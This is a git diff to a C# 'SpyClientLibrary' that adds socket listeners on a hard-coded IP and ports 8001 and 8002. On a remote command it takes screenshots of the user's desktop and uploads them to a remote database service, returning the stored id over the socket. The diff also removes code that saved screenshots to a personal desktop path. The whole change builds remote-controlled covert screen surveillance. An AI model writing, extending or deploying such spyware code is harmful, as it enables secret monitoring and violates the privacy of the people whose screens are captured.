@@ -5,6 +5,10 @@ using System.Text;
 using System.Threading.Tasks;
 using SpyClientLibrary.ServiceReference;
 using System.Drawing;
+using System.Net;
+using System.Net.Sockets;
+using System.IO;
+using System.Threading;
 
 
 namespace SpyClientLibrary
@@ -19,6 +23,11 @@ namespace SpyClientLibrary
         }
         public void StartControl()
         {
+            Console.WriteLine("Start working");
+            GetCmd();
+            Thread ThredScreen = new Thread(new ThreadStart(WaitForScreenCMD));
+            ThredScreen.Start();
+
             _user = new User();
             _taskmanager = new TaskManager(1);
             while(true)
@@ -31,12 +40,54 @@ namespace SpyClientLibrary
                 }
             }
         }
-        public void SendScreen(ScreenShot screen)
+
+        public void WaitForScreenCMD()
         {
+            while (true)
+            {
+                IPAddress ipAd = IPAddress.Parse("95.108.69.237");
+                TcpListener myList = new TcpListener(ipAd, 8002);
+                myList.Start();
+
+                byte[] b = new byte[100];
+                Socket s = myList.AcceptSocket();
+                int k = s.Receive(b);
+                for (int i = 0; i < k; i++)
+                    Console.Write(Convert.ToChar(b[i]));
+
+                ScreenShot screen = new ScreenShot(_user);
+                var id = SendScreen(screen);
+                ASCIIEncoding asen = new ASCIIEncoding();
+                s.Send(asen.GetBytes(id.ToString()));
+                s.Close();
+                myList.Stop();
+            }
+        }
+        private void GetCmd()
+        {
+            IPAddress ipAd = IPAddress.Parse("95.108.69.237");
+            TcpListener myList = new TcpListener(ipAd, 8001);
+            myList.Start();
+
+            byte[] b = new byte[100];
+            Socket s = myList.AcceptSocket();
+            int k = s.Receive(b);
+            for (int i = 0; i < k; i++)
+                Console.Write(Convert.ToChar(b[i]));
+
+            ASCIIEncoding asen = new ASCIIEncoding();
+            s.Send(asen.GetBytes("StartACK"));
+            s.Close();
+            myList.Stop();
+        } 
+
+        public int SendScreen(ScreenShot screen)
+        {
+            int id;
             using (ClientServiceClient client = new ClientServiceClient())
             {                
                 screen.GenerateCurrentScreen();
-                var response = client.SaveScreenShotToDB(
+                id = client.SaveScreenShotToDB(
                         new ClientRequest()
                         {
                             _username = screen._user._userName,
@@ -45,22 +96,7 @@ namespace SpyClientLibrary
                             _data = screen._data
                         });
             }
-            SaveScreenOnDisk(screen._data);
-        }
-        public Image GetLastScreenTest()
-        {
-            using (ClientServiceClient client = new ClientServiceClient())
-            {
-                var response = client.GetScreenFromDB();
-                Image tosave =ScreenShot.byteArrayToImage(response);
-
-                return tosave;
-            }
-        }
-        public void SaveScreenOnDisk(byte[] screen)
-        {
-            Image tosave = ScreenShot.byteArrayToImage(screen);
-            tosave.Save("C:\\Users\\Michał\\Desktop\\nowy.png");
+            return id;
         }
     }
 }
